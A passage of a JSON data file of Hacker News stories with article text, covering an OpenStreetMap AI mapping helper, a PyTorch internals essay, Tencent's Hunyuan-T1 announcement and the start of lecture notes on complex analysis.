argument.All the existing elements of interest are downloaded from OpenStreetMap, and all the tiles are downloaded from Mapbox and joined to create a stacked image.The stacked image is divided into overlapping tiles. For each tile, we run the Object Detection model (YOLOv11). If an object of interest is detected (e.g. a swimming pool), we pass the bounding box to the Segmentation model (SAM2) to obtain a segmentation mask.All the predicted polygons are checked against the existing ones, downloaded from OpenStreetMap, in order to avoid duplicates.All those identified as new are displayed one by one for manual verification and filtering.The ones you chose to keep will be then uploaded to OpenStreetMap in a single changeset.Closing thoughtsOpenStreetMap is a powerful example of open collaboration to create a rich, community-driven map of the world. The OpenStreatMap AI Helper Blueprint shows that, with the right approach, AI can enhance human contributions while keeping human verification at the core.In the fully manual process it takes about 1 min to map 2-3 swimming pools, whereas using the blueprint, even without an optimized UX, I can map about 10-15 in the same time (~5x more).It also highlights the value of high-quality data from projects like OpenStreetMap, which enables to easily train models like YOLOv11 to perform object detection – proving that you shouldn’t always throw an LLM at the problem.We’d love for you to try the OpenStreetMap AI Helper Blueprint and experiment with training a model on a different map feature. If you’re interested, feel free to contribute to the repo to help improve it, or fork it to extend it even further!To find other Blueprints we’ve released, check out the Blueprints Hub.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "09e9f98019f60115",
    "title": {
      "en": "PyTorch Internals: Ezyang's Blog",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://blog.ezyang.com/2019/05/pytorch-internals/",
    "score": 269,
    "by": "Anon84",
    "time": 1742654344,
    "content": "PyTorch internals\n\nThis post is a long form essay version of a talk about PyTorch internals, that I gave at the PyTorch NYC meetup on May 14, 2019.\n\nHi everyone!  Today I want to talk about the internals of PyTorch.\n\nThis talk is for those of you who have used PyTorch, and thought to yourself, \"It would be great if I could contribute to PyTorch,\" but were scared by PyTorch's behemoth of a C++ codebase.  I'm not going to lie: the PyTorch codebase can be a bit overwhelming at times. The purpose of this talk is to put a map in your hands: to tell you about the basic conceptual structure of a \"tensor library that supports automatic differentiation\", and give you some tools and tricks for finding your way around the codebase.  I'm going to assume that you've written some PyTorch before, but haven't necessarily delved deeper into how a machine learning library is written.\n\nThe talk is in two parts: in the first part, I'm going to first introduce you to the conceptual universe of a tensor library.  I'll start by talking about the tensor data type you know and love, and give a more detailed discussion about what exactly this data type provides, which will lead us to a better understanding of how it is actually implemented under the hood.  If you're an advanced user of PyTorch, you'll be familiar with most of this material.  We'll also talk about the trinity of \"extension points\", layout, device and dtype, which guide how we think about extensions to the tensor class.  In the live talk at PyTorch NYC, I skipped the slides about autograd, but I'll talk a little bit about them in these notes as well.\nThe second part grapples with the actual nitty gritty details involved with actually coding in PyTorch.  I'll tell you how to cut your way through swaths of autograd code, what code actually matters and what is legacy, and also all of the cool tools that PyTorch gives you for writing kernels.\n\nThe tensor is the central data structure in PyTorch.  You probably have a pretty good idea about what a tensor intuitively represents: its an n-dimensional data structure containing some sort of scalar type, e.g., floats, ints, et cetera.  We can think of a tensor as consisting of some data, and then some metadata describing the size of the tensor, the type of the elements in contains (dtype), what device the tensor lives on (CPU memory? CUDA memory?)\n\nThere's also a little piece of metadata you might be less familiar with: the stride.  Strides are actually one of the distinctive features of PyTorch, so it's worth discussing them a little more.\n\nA tensor is a mathematical concept.  But to represent it on our computers, we have to define some sort of physical representation for them.  The most common representation is to lay out each element of the tensor contiguously in memory (that's where the term contiguous comes from), writing out each row to memory, as you see above. In the example above, I've specified that the tensor contains 32-bit integers, so you can see that each integer lies in a physical address, each offset four bytes from each other.  To remember what the actual dimensions of the tensor are, we have to also record what the sizes are as extra metadata.\nSo, what do strides have to do with this picture?\n\nSuppose that I want to access the element at position tensor[1, 0] in my logical representation.  How do I translate this logical position into a location in physical memory?  Strides tell me how to do this: to find out where any element for a tensor lives, I multiply each index with the respective stride for that dimension, and sum them all together.  In the picture above, I've color coded the first dimension blue and the second dimension red, so you can follow the index and stride in the stride calculation.  Doing this sum, I get two (zero-indexed), and indeed, the number three lives two below the beginning of the contiguous array.\n(Later in the talk, I'll talk about TensorAccessor, a convenience class that handles the indexing calculation.  When you use TensorAccessor, rather than raw pointers, this calculation is handled under the covers for you.)\nStrides are the fundamental basis of how we provide views to PyTorch users.  For example, suppose that I want to extract out a tensor that represents the second row of the tensor above:\n\nUsing advanced indexing support, I can just write tensor[1, :] to get this row.  Here's the important thing: when I do this, I don't create a new tensor; instead, I just return a tensor which is a different view on the underlying data.  This means that if I, for example, edit the data in that view, it will be reflected in the original tensor.  In this case, it's not too hard to see how to do this: three and four live in contiguous memory, and all we need to do is record an offset saying that the data of this (logical) tensor lives two down from the top.  (Every tensor records an offset, but most of the time it's zero, and I'll omit it from my diagrams when that's the case.)\n\nQuestion from the talk: If I take a view on a tensor, how do I free the memory of the underlying tensor?\nAnswer: You have to make a copy of the view, thus disconnecting it from the original physical memory.  There's really not much else you can do.  By the way, if you have written Java in the old days, taking substrings of strings has a similar problem, because by default no copy is made, so the substring retains the (possibly very large string). Apparently, they fixed this in Java 7u6.\n\nA more interesting case is if I want to take the first column:\n\nWhen we look at the physical memory, we see that the elements of the column are not contiguous: there's a gap of one element between each one.  Here, strides come to the rescue: instead of specifying a stride of one, we specify a stride of two, saying that between one element and the next, you need to jump two slots.  (By the way, this is why it's called a \"stride\": if we think of an index as walking across the layout, the stride says how many locations we stride forward every time we take a step.)\nThe stride representation can actually let you represent all sorts of interesting views on tensors; if you want to play around with the possibilities, check out the Stride Visualizer.\nLet's step back for a moment, and think about how we would actually implement this functionality (after all, this is an internals talk.)  If we can have views on tensor, this means we have to decouple the notion of the tensor (the user-visible concept that you know and love), and the actual physical data that stores the data of the tensor (called storage):\n\nThere may be multiple tensors which share the same storage.  Storage defines the dtype and physical size of the tensor, while each tensor records the sizes, strides and offset, defining the logical interpretation of the physical memory.\nOne thing to realize is that there is always a pair of Tensor-Storage, even for \"simple\" cases where you don't really need a storage (e.g., you just allocated a contiguous tensor with torch.zeros(2, 2)).\n\nBy the way, we're interested in making this picture not true; instead of having a separate concept of storage, just define a view to be a tensor that is backed by a base tensor.  This is a little more complicated, but it has the benefit that contiguous tensors get a much more direct representation without the Storage indirection.  A change like this would make PyTorch's internal representation a bit more like Numpy's.\n\nWe've talked quite a bit about the data layout of tensor (some might say, if you get the data representation right, everything else falls in place).  But it's also worth briefly talking about how operations on the tensor are implemented.  At the very most abstract level, when you call torch.mm, two dispatches happen:\n\nThe first dispatch is based on the device type and layout of a tensor: e.g., whether or not it is a CPU tensor or a CUDA tensor (and also, e.g., whether or not it is a strided tensor or a sparse one).  This is a dynamic dispatch: it's a virtual function call (exactly where that virtual function call occurs will be the subject of the second half of this talk).  It should make sense that you need to do a dispatch here: the implementation of CPU matrix multiply is quite different from a CUDA implementation.  It is a dynamic dispatch because these kernels may live in separate libraries (e.g., libcaffe2.so versus libcaffe2_gpu.so), and so you have no choice: if you want to get into a library that you don't have a direct dependency on, you have to dynamic dispatch your way there.\nThe second dispatch is a dispatch on the dtype in question.  This dispatch is just a simple switch-statement for whatever dtypes a kernel chooses to support.  Upon reflection, it should also make sense that we need to a dispatch here: the CPU code (or CUDA code, as it may) that implements multiplication on float is different from the code for int.  It stands to reason you need separate kernels for each dtype.\nThis is probably the most important mental picture to have in your head, if you're trying to understand the way operators in PyTorch are invoked.  We'll return to this picture when it's time to look more at code.\n\nSince we have been talking about Tensor, I also want to take a little time to the world of tensor extensions.  After all, there's more to life than dense, CPU float tensors.  There's all sorts of interesting extensions going on, like XLA tensors, or quantized tensors, or MKL-DNN tensors, and one of the things we have to think about, as a tensor library, is how to accommodate these extensions.\n\nOur current model for extensions offers four extension points on tensors.  First, there is the trinity three parameters which uniquely determine what a tensor is:\n\nThe device, the description of where the tensor's physical memory is actually stored, e.g., on a CPU, on an NVIDIA GPU (cuda), or perhaps on an AMD GPU (hip) or a TPU (xla).  The distinguishing characteristic of a device is that it has its own allocator, that doesn't work with any other device.\nThe layout, which describes how we logically interpret this physical memory.  The most common layout is a strided tensor, but sparse tensors have a different layout involving a pair of tensors, one for indices, and one for data; MKL-DNN tensors may have even more exotic layout, like blocked layout, which can't be represented using merely strides.\nThe dtype, which describes what it is that is actually stored in each element of the tensor.  This could be floats or integers, or it could be, for example, quantized integers.\n\nIf you want to add an extension to PyTorch tensors (by the way, if that's what you want to do, please talk to us!  None of these things can be done out-of-tree at the moment), you should think about which of these parameters you would extend.  The Cartesian product of these parameters define all of the possible tensors you can make.  Now, not all of these combinations may actually have kernels (who's got kernels for sparse, quantized tensors on FPGA?) but in principle the combination could make sense, and thus we support expressing it, at the very least.\nThere's one last way you can make an \"extension\" to Tensor functionality, and that's write a wrapper class around PyTorch tensors that implements your object type.  This perhaps sounds obvious, but sometimes people reach for extending one of the three parameters when they should have just made a wrapper class instead.  One notable merit of wrapper classes is they can be developed entirely out of tree.\nWhen should you write a tensor wrapper, versus extending PyTorch itself?  The key test is whether or not you need to pass this tensor along during the autograd backwards pass.  This test, for example, tells us that sparse tensor should be a true tensor extension, and not just a Python object that contains an indices and values tensor: when doing optimization on networks involving embeddings, we want the gradient generated by the embedding to be sparse.\n\nOur philosophy on extensions also has an impact of the data layout of tensor itself.  One thing we really want out of our tensor struct is for it to have a fixed layout: we don't want fundamental (and very frequently called) operations like \"What's the size of a tensor?\" to require virtual dispatches.  So when you look at the actual layout of a Tensor (defined in the TensorImpl struct),  what we see is a common prefix of all fields that we consider all \"tensor\"-like things to universally have, plus a few fields that are only really applicable for strided tensors, but are so important that we've kept them in the main struct, and then a suffix of custom fields that can be done on a per-Tensor basis.  Sparse tensors, for example, store their indices and values in this suffix.\n\nI told you all about tensors, but if that was the only thing PyTorch provided, we'd basically just be a Numpy clone.  The distinguishing characteristic of PyTorch when it was originally released was that it provided automatic differentiation on tensors (these days, we have other cool features like TorchScript; but back then, this was it!)\nWhat does automatic differentiation do?  It's the machinery that's responsible for taking a neural network:\n\n...and fill in the missing code that actually computes the gradients of your network:\n\nTake a moment to study this diagram.  There's a lot to unpack; here's what to look at:\n\nFirst, rest your eyes on the variables in red and blue.  PyTorch implements reverse-mode automatic differentiation, which means that we effectively walk the forward computations \"backward\" to compute the gradients.  You can see this if you look at the variable names: at the bottom of the red, we compute loss; then, the first thing we do in the blue part of the program is compute grad_loss.  loss was computed from next_h2, so we compute grad_next_h2.  Technically, these variables which we call grad_ are not really gradients; they're really Jacobians left-multiplied by a vector, but in PyTorch we just call them grad and mostly everyone knows what we mean.\nIf the structure of the code stays the same, the behavior doesn't: each line from forwards is replaced with a different computation, that represents the derivative of the forward operation.  For example, the tanh operation is translated into a tanh_backward operation (these two lines are connected via a grey line on the left hand side of the diagram).  The inputs and outputs of the forward and backward operations are swapped: if the forward operation produced next_h2, the backward operation takes grad_next_h2 as an input.\n\nThe whole point of autograd is to do the computation that is described by this diagram, but without actually ever generating this source.  PyTorch autograd doesn't do a source-to-source transformation (though PyTorch JIT does know how to do symbolic differentiation).\n\nTo do this, we need to store more metadata when we carry out operations on tensors.  Let's adjust our picture of the tensor data structure: now instead of just a tensor which points to a storage, we now have a variable which wraps this tensor, and also stores more information (AutogradMeta), which is needed for performing autograd when a user calls loss.backward() in their PyTorch script.\n\nThis is yet another slide which will hopefully be out of date in the near future.  Will Feng is working on a Variable-Tensor merge in C++, following a simple merge which happened to PyTorch's frontend interface.\nWe also have to update our picture about dispatch:\n\nBefore we dispatch to CPU or CUDA implementations, there is another dispatch on variables, which is responsible for unwrapping variables, calling the underlying implementation (in green), and then rewrapping the results into variables and recording the necessary autograd metadata for backwards.\nSome implementations don't unwrap; they just call into other variable implementations.  So you might spend a while in the Variable universe.  However, once you unwrap and go into the non-Variable Tensor universe, that's it; you never go back to Variable (except by returning from your function.)\n\nIn my NY meetup talk, I skipped the following seven slides.  I'm also going to delay writeup for them; you'll have to wait for the sequel for some text.\n\nEnough about concepts, let's look at some code.\n\nPyTorch has a lot of folders, and there is a very detailed description of what they are in the CONTRIBUTING document, but really, there are only four directories you really need to know about:\n\nFirst, torch/ contains what you are most familiar with: the actual Python modules that you import and use.  This stuff is Python code and easy to hack on (just make a change and see what happens).  However, lurking not too deep below the surface is...\ntorch/csrc/, the C++ code that implements what you might call the frontend of PyTorch.  In more descriptive terms, it implements the binding code that translates between the Python and C++ universe, and also some pretty important pieces of PyTorch, like the autograd engine and the JIT compiler.  It also contains the C++ frontend code.\naten/, short for \"A Tensor Library\" (coined by Zachary DeVito), is a C++ library that implements the operations of Tensors.  If you're looking for where some kernel code lives, chances are it's in ATen.  ATen itself bifurcates into two neighborhoods of operators: the \"native\" operators, which are modern, C++ implementations of operators, and the \"legacy\" operators (TH, THC, THNN, THCUNN), which are legacy, C implementations.  The legacy operators are the bad part of town; try not to spend too much time there if you can.\nc10/, which is a pun on Caffe2 and A\"Ten\" (get it? Caffe 10) contains the core abstractions of PyTorch, including the actual implementations of the Tensor and Storage data structures.\n\nThat's a lot of places to look for code; we should probably simplify the directory structure, but that's how it is.  If you're trying to work on operators, you'll spend most of your time in aten.\nLet's see how this separation of code breaks down in practice:\n\nWhen you call a function like torch.add, what actually happens?  If you remember the discussion we had about dispatching, you already have the basic picture in your head:\n\nWe have to translate from Python realm to the C++ realm (Python argument parsing)\nWe handle variable dispatch (VariableType--Type, by the way, doesn't really have anything to do programming language types, and is just a gadget for doing dispatch.)\nWe handle device type / layout dispatch (Type)\nWe have the actual kernel, which is either a modern native function, or a legacy TH function.\n\nEach of these steps corresponds concretely to some code.  Let's cut our way through the jungle.\n\nOur initial landing point in the C++ code is the C implementation of a Python function, which we've exposed to the Python side as something like torch._C.VariableFunctions.add.  THPVariable_add is the implementation of one such implementation.\nOne important thing to know about this code is that it is auto-generated.  If you search in the GitHub repository, you won't find it, because you have to actually build PyTorch to see it.  Another important thing is, you don't have to really deeply understand what this code is doing; the idea is to skim over it and get a sense for what it is doing.  Above, I've annotated some of the most important bits in blue: you can see that there is a use of a class PythonArgParser to actually pull out C++ objects out of the Python args and kwargs; we then call a dispatch_add function (which I've inlined in red); this releases the global interpreter lock and then calls a plain old method on the C++ Tensor self.  On its way back, we rewrap the returned Tensor back into a PyObject.\n(At this point, there's an error in the slides: I'm supposed to tell you about the Variable dispatch code.  I haven't fixed it here yet.  Some magic happens, then...)\n\nWhen we call the add method on the Tensor class, no virtual dispatch happens yet.  Instead, we have an inline method which calls a virtual method on a \"Type\" object.  This method is the actual virtual method (this is why I say Type is just a \"gadget\" that gets you dynamic dispatch.)  In the particular case of this example, this virtual call dispatches to an implementation of add on a class named TypeDefault.  This happens to be because we have an implementation of add that is the same for every device type (both CPU and CUDA); if we had happened to have different implementations, we might have instead landed on something like CPUFloatType::add.  It is this implementation of the virtual method that finally gets us to the actual kernel code.\n\nHopefully, this slide will be out-of-date very soon too; Roy Li is working on replacing Type dispatch with another mechanism which will help us better support PyTorch on mobile.\nIt's worth reemphasizing that all of the code, until we got to the kernel, is automatically generated.\n\nIt's a bit twisty and turny, so once you have some basic orientation about what's going on, I recommend just jumping straight to the kernels.\n\nPyTorch offers a lot of useful tools for prospective kernel writers.  In this section, we'll walk through a few of them.  But first of all, what do you need to write a kernel?\n\nWe generally think of a kernel in PyTorch consisting of the following parts:\n\nFirst, there's some metadata which we write about the kernel, which powers the code generation and lets you get all the bindings to Python, without having to write a single line of code.\nOnce you've gotten to the kernel, you're past the device type / layout dispatch. The first thing you need to write is error checking, to make sure the input tensors are the correct dimensions.  (Error checking is really important!  Don't skimp on it!)\nNext, we generally have to allocate the result tensor which we are going to write the output into.\nTime for the kernel proper.  At this point, you now should do the second, dtype dispatch, to jump into a kernel which is specialized per dtype it operates on.  (You don't want to do this too early, because then you will be uselessly duplicating code that looks the same in any case.)\nMost performant kernels need some sort of parallelization, so that you can take advantage of multi-CPU systems.  (CUDA kernels are \"implicitly\" parallelized, since their programming model is built on top of massive parallelization).\nFinally, you need to access the data and do the computation you wanted to do!\n\nIn the subsequent slides, we'll walk through some of the tools PyTorch has for helping you implementing these steps.\n\nTo take advantage of all of the code generation which PyTorch brings, you need to write a schema for your operator.  The schema gives a mypy-esque type of your function, and also controls whether or not we generate bindings for methods or functions on Tensor.  You also tell the schema what implementations of your operator should be called for given device-layout combinations.  Check out the README in native is for more information about this format.\n\nYou also may need to define a derivative for your operation in derivatives.yaml.\n\nError checking can be done by way of either a low level or a high level API.  The low level API is just a macro, TORCH_CHECK, which takes a boolean, and then any number of arguments to make up the error string to render if the boolean is not true.  One nice thing about this macro is that you can intermix strings with non-string data; everything is formatted using their implementation of operator<<, and most important data types in PyTorch have operator<< implementations.\nThe high level API saves you from having to write up repetitive error messages over and over again.  The way it works is you first wrap each Tensor into a TensorArg, which contains information about where the tensor came from (e.g., its argument name).  It then provides a number of pre-canned functions for checking various properties; e.g., checkDim() tests if the tensor's dimensionality is a fixed number.  If it's not, the function provides a user-friendly error message based on the TensorArg metadata.\n\nOne important thing to be aware about when writing operators in PyTorch, is that you are often signing up to write three operators: abs_out, which operates on a preallocated output (this implements the out= keyword argument), abs_, which operates inplace, and abs, which is the plain old functional version of an operator.\nMost of the time, abs_out is the real workhorse, and abs and abs_ are just thin wrappers around abs_out; but sometimes writing specialized implementations for each case are warranted.\n\nTo do dtype dispatch, you should use the AT_DISPATCH_ALL_TYPES macro.  This takes in the dtype of the tensor you want to dispatch over, and a lambda which will be specialized for each dtype that is dispatchable from the macro.  Usually, this lambda just calls a templated helper function.\nThis macro doesn't just \"do dispatch\", it also decides what dtypes your kernel will support.  As such, there are actually quite a few versions of this macro, which let you pick different subsets of dtypes to generate specializations for.  Most of the time, you'll just want AT_DISPATCH_ALL_TYPES, but keep an eye out for situations when you might want to dispatch to some more types.  There's guidance in Dispatch.h for how to select the correct one for your use-case.\n\nOn CPU, you frequently want to parallelize your code.  In the past, this was usually done by directly sprinkling OpenMP pragmas in your code.\n\nAt some point, we have to actually access the data.  PyTorch offers quite a few options for doing this.\n\nIf you just want to get a value at some specific location, you should use TensorAccessor.  A tensor accessor is like a tensor, but it hard codes the dimensionality and dtype of the tensor as template parameters.  When you retrieve an accessor like x.accessor<float, 3>();, we do a runtime test to make sure that the tensor really is this format; but after that, every access is unchecked.  Tensor accessors handle strides correctly, so you should prefer using them over raw pointer access (which, unfortunately, some legacy kernels do.)  There is also a PackedTensorAccessor, which is specifically useful for sending an accessor over a CUDA launch, so that you can get accessors from inside your CUDA kernel.  (One notable gotcha: TensorAccessor defaults to 64-bit indexing, which is much slower than 32-bit indexing in CUDA!)\nIf you're writing some sort of operator with very regular element access, for example, a pointwise operation, you are much better off using a higher level of abstraction, the TensorIterator.   This helper class automatically handles broadcasting and type promotion for you, and is quite handy.\nFor true speed on CPU, you may need to write your kernel using vectorized CPU instructions.  We've got helpers for that too!  The Vec256 class represents a vector of scalars and provides a number of methods which perform vectorized operations on them all at once.  Helpers like binary_kernel_vec then let you easily run vectorized operations, and then finish everything that doesn't round nicely into vector instructions using plain old instructions.  The infrastructure here also manages compiling your kernel multiple times under different instruction sets, and then testing at runtime what instructions your CPU supports, and using the best kernel in those situations.\n\nA lot of kernels in PyTorch are still written in the legacy TH style.  (By the way, TH stands for TorcH.  It's a pretty nice acronym, but unfortunately it is a bit poisoned; if you see TH in the name, assume that it's legacy.)  What do I mean by the legacy TH style?\n\nIt's written in C style, no (or very little) use of C++.\nIt's manually refcounted (with manual calls to THTensor_free to decrease refcounts when you're done using tensors), and\nIt lives in generic/ directory, which means that we are actually going to compile the file multiple times, but with different #define scalar_t.\n\nThis code is pretty crazy, and we hate reviewing it, so please don't add to it.  One of the more useful tasks that you can do, if you like to code but don't know too much about kernel writing, is to port some of these TH functions to ATen.\n\nTo wrap up, I want to talk a little bit about working efficiently on PyTorch.  If the largeness of PyTorch's C++ codebase is the first gatekeeper that stops people from contributing to PyTorch, the efficiency of your workflow is the second gatekeeper.  If you try to work on C++ with Python habits, you will have a bad time: it will take forever to recompile PyTorch, and it will take you forever to tell if your changes worked or not.\nHow to work efficiently could probably be a talk in and of itself, but this slide calls out some of the most common anti-patterns I've seen when someone complains: \"It's hard to work on PyTorch.\"\n\nIf you edit a header, especially one that is included by many source files (and especially if it is included by CUDA files), expect a very long rebuild.  Try to stick to editing cpp files, and edit headers sparingly!\nOur CI is a very wonderful, zero-setup way to test if your changes worked or not. But expect to wait an hour or two before you get back signal.  If you are working on a change that will require lots of experimentation, spend the time setting up a local development environment.  Similarly, if you run into a hard to debug problem on a specific CI configuration, set it up locally.  You can download and run the Docker images locally\nThe CONTRIBUTING guide explains how to setup ccache; this is highly recommended, because sometimes it will help you get lucky and avoid a massive recompile when you edit a header.  It also helps cover up bugs in our build system, when we recompile files when we shouldn't.\nAt the end of the day, we have a lot of C++ code, and you will have a much more pleasant experience if you build on a beefy server with CPUs and RAM.  In particular, I don't recommend doing CUDA builds on a laptop; building CUDA is sloooooow and laptops tend to not have enough juice to turnaround quickly enough.\n\nSo that's it for a whirlwind tour of PyTorch's internals!  Many, many things have been omitted; but hopefully the descriptions and explanations here can help you get a grip on at least a substantial portion of the codebase.\nWhere should you go from here?  What kinds of contributions can you make?  A good place to start is our issue tracker.  Starting earlier this year, we have been triaging issues; issues labeled triaged mean that at least one PyTorch developer has looked at it and made an initial assessment about the issue.  You can use these labels to find out what issues we think are high priority or look up issues specific to some module, e.g., autograd or find issues which we think are small (word of warning: we're sometimes wrong!)\nEven if you don't want to get started with coding right away, there are many other useful activities like improving documentation (I love merging documentation PRs, they are so great), helping us reproduce bug reports from other users, and also just helping us discuss RFCs on the issue tracker. PyTorch would not be where it is today without our open source contributors; we hope you can join us too!\n\n          May 16, 2019\n          PyTorch",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "bfd23bb5d8d8073e",
    "title": {
      "en": "Tencent's 'Hunyuan-T1'–The First Mamba-Powered Ultra-Large Model",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://llm.hunyuan.tencent.com/#/blog/hy-t1?lang=en",
    "score": 145,
    "by": "marban",
    "time": 1742664332,
    "content": "Introduction\n            Reinforcement learning has pioneered a new Scaling paradigm in the post-training phase of large language models, a breakthrough that is increasingly attracting attention from the industry. With the successive release of OpenAI's O-series models and DeepSeek R1, the excellent performance demonstrated by the models fully proves the crucial role of reinforcement learning in the optimization process.\n\n            In mid-February this year, the Hunyuan team launched the Hunyuan T1-Preview (Hunyuan-Thinker-1-Preview) reasoning model based on the medium-scale Hunyuan base on the Tencent Yuanbao APP, bringing users an ultimate and rapid in-depth thinking experience.\n\n            Today, we are very pleased to announce that the in-depth thinking model of the Hunyuan large model series has been successfully upgraded to the Hunyuan-T1 official version. This model is based on the TurboS fast-thinking base, the world's first ultra-large-scale Hybrid-Transformer-Mamba MoE large model released by us at the beginning of March. Through large-scale post-training, its reasoning ability has been significantly expanded and further aligned with human preferences.\n\n            Compared with the previous T1-preview model, Hunyuan-T1 has shown a significant overall performance improvement and is a leading cutting-edge strong reasoning large model in the industry.\n\n            Based on TurboS, T1 shows unique advantages in the direction of in-depth reasoning. TurboS's long-text capture ability helps Turbo-S effectively solve the problems of context loss and long-distance information dependence often encountered in long-text reasoning. Secondly, its Mamba architecture specifically optimizes the processing ability of long sequences. Through an efficient computing method, it can ensure the ability to capture long-text information while significantly reducing the consumption of computing resources. Under the same deployment conditions, the decoding speed is 2 times faster.\n\n            In the post-training phase of the model, we invested 96.7% of our computing power in reinforcement learning training, focusing on improving pure reasoning ability and optimizing alignment with human preferences.\n\n            We collected world science and reasoning problems, covering mathematics/logic reasoning/science/code, etc. These data sets cover everything from basic mathematical reasoning to complex scientific problem solving. Combined with ground-truth real feedback, we ensure that the model can demonstrate excellent capabilities when facing various reasoning tasks.\n\n            In terms of training plans, we adopted a curriculum learning approach to gradually increase data difficulty while expanding the model's context length in a step-by-step manner, enabling the model to improve its reasoning ability while learning to use tokens efficiently for reasoning.\n\n            Regarding the training strategy, we referred to classic reinforcement learning strategies such as data replay and periodic policy resetting, which significantly improved the long-term stability of model training by over 50%. During the alignment with human preferences phase, we adopted a unified reward system feedback scheme of self-rewarding (based on an early version of T1-preview to comprehensively evaluate and score the model's output) + reward mode, guiding the model to self-improve. The model shows richer content details and more efficient information in its responses.\n\n            In addition to achieving comparable or slightly better results than R1 on various public benchmarks such as MMLU-pro, CEval, AIME, Zebra Logic, and other Chinese and English knowledge and competition-level math and logical reasoning indicators, Hunyuan-T1 also performs on par with R1 in internal human evaluation datasets. It has a slight edge in cultural and creative instruction following, text summarization, and agent capabilities.\n\n            From the perspective of comprehensive evaluation metrics, the overall performance of Hunyuan-T1 can be on a par with first-class cutting-edge inference models.\n            In terms of comprehensive ability evaluation, T1 ranks second only to O1 on MMLU-PRO, with a high score of 87.2. This test set covers questions from 14 fields such as humanities,\n            social sciences, and science and engineering, mainly testing the model's memory and understanding of extensive knowledge.\n            Additionally, there is GPQA-diamond, which focuses on professional domain knowledge and complex scientific reasoning, mainly including doctoral-level difficult problems in physics, chemistry, and biology. T1 achieved a score of 69.3.\n\n            In the field of science and engineering, we tested scenarios that require strong reasoning abilities, such as coding, mathematics, and logical reasoning.\n            In the code evaluation of LiveCodeBench, T1 reached a score of 64.9. Meanwhile, T1 also performs excellently in mathematics.\n            Especially on MATH-500, it achieved an excellent score of 96.2, closely following DeepSeek R1, demonstrating T1's comprehensive ability in solving math problems.\n            Besides, T1 has shown very strong adaptability in multiple alignment tasks, instruction-following tasks, and tool utilization tasks. For example, T1 achieved a score of 91.9 in the ArenaHard task.\n           Model Effect   Note: The evaluation metrics of other models in the table are from official evaluation results. For the parts not included in the official evaluation results, they are from the results of the Hunyuan internal evaluation platform.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "9de1101d0d490e83",
    "title": {
      "en": "Mathematical Methods for Physics [pdf]",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.ma.imperial.ac.uk/~dturaev/Mathematical_Methods2021.pdf",
    "score": 68,
    "by": "ibobev",
    "time": 1742673532,
    "content": "Mathematical Methods PHYS50007  Lectured by Dmitry Turaev ∗  assisted by Henry Chiu, Lifan Xuan, and Stuart Patching Spring Term 2021  1   Lecture 1: Analytic Functions of a Complex Variable  1.1   Definitions and Basic Properties  A complex number has the form   z   =   x   +   iy .   We denote the   real   and   imaginary   parts respectively as  x   = Re( z ) and   y   = Im( z ). We may also think of   z   as a point in the complex plane,which in polar coordinates has   absolute value   r   =   | z |   =   √ x 2   +   y 2   and   argument   ϕ   satisfying   x   =   r   cos   ϕ   and   y   =   r   sin   ϕ . Note that   ϕ  is defined periodically with period 2 π   and may also be denoted   ϕ   = arg( z ).  Figure 1: A complex number visualised on the com- plex plane.  Complex numbers obey the following algebraic properties:  z 1   +   z 2   =( x 1   +   x 2 ) +   i ( y 1   +   y 2 )  z 1 z 2   =( x 1   +   iy 1 )( x 2   +   iy 2 ) = ( x 1 x 2   −   y 1 y 2 ) +   i ( y 1 x 2   +   x 1 y 2 ) i.e. they have the same algebra as the real numbers, with the convention   i 2   =   − 1.  ∗ dturaev@imperial.ac.uk; lecture notes from previous years are available at   https://wwwf.imperial.ac.uk/~dturaev/  1\n\nFigure 2: Complex conjugate   z ∗   =   x   −   iy   is defined by reflecting in the   x -axis.  If   z   =   x   +   iy   then the   complex conjugate   is defined as   z ∗   =   x   −   iy , which is the symmetric image of   z   with respect to the   x -axis. Note the following properties of the complex conjugate:  r ( z ) = √ x 2   +   y 2   =   r ( z ∗ )  ϕ ( z ) =   −   ϕ ( z ∗ )  zz ∗   =( x   +   iy )( x   −   iy ) =   x 2   +   y 2   =   | z | 2  This helps us to obtain a useful formula for the division of complex numbers:  z 1  z 2  =   z 1 z ∗  2  z 2 z ∗  2  =  ( x 1   +   iy 1 )( x 2   −   iy 2 )  x 2 2   +   y 2 2  We may also do multiplication in polar coordinates:  z 1 z 2   =( r 1   cos   ϕ 1   +   ir 1   sin   ϕ 1 )( r 2   cos   ϕ 2   +   ir 2   sin   ϕ 2 ) = r 1 r 2   [cos   ϕ 1   cos   ϕ 2   −   sin   ϕ 1   sin   ϕ 2   +   i (cos   ϕ 1   sin   ϕ 2   + sin   ϕ 1   cos   ϕ 2 )] = r 1 r 2   [cos( ϕ 1   +   ϕ 2 ) +   i   sin( ϕ 1   +   ϕ 2 )] where we use the double-angle formulae for sin and cos. Then we see that  | z 1 z 2 |   =   | z 1 | | z 2 |  and arg( z 1 z 2 ) = arg( z 1 ) + arg( z 2 ) .  Thus, we may take the   n th power and, after that,   n th root of   z   as:  z n   = r n (cos( nϕ ) +   i   sin( nϕ ))  n √ z   = cos  (   ϕ   + 2 πk n  )  +   i   sin  (   ϕ   + 2 πk n  )  for   k   = 0 , ..., n   −   1 Each non-zero   z   has   n   different   n th roots and these are related by rotations in the complex plane, see Figure 3. 2\n\nFigure 3:   The   n th roots are related by rotation through angle 2 π/n   in the complex plane.  1.2   Functions of Complex Variables  A standard notation we use for a complex function is  f   ( z ) =   u ( x, y ) +   iv ( x, y )  Examples  1. The simplest complex functions are   f   ( z ) =   a   =   constant   and   f   ( z ) =   z . By doing multiplication and addition with these, we obtain 2. Polynomials:  P   ( z ) =   a 0   +   a 1 z   +   ...   +   a n z n  Employing division operation, we obtain 3. Rational functions:  R ( z ) =   P   ( z )  Q ( z ) where   P   and   Q   are both polynomials. 4. A more advanced example is given by Sums of convergent power series:  f   ( z ) =  ∞ ∑  n =0  a n z n  If there exist   C >   0 and   ρ >   0 such that   | a n | ≤   Cρ − n   then the series is convergent for all   z   with  | z |   < ρ . The maximal such   ρ   is called the   radius of convergence   of   f   . In particular, if the sequence   a n  is bounded, then   f   is convergent at least for   | z |   <   1. For example, consider the following function (the sum of geometric progression):  f   ( z ) =  ∞ ∑  n =0  z n  3\n\nIn this case   a n  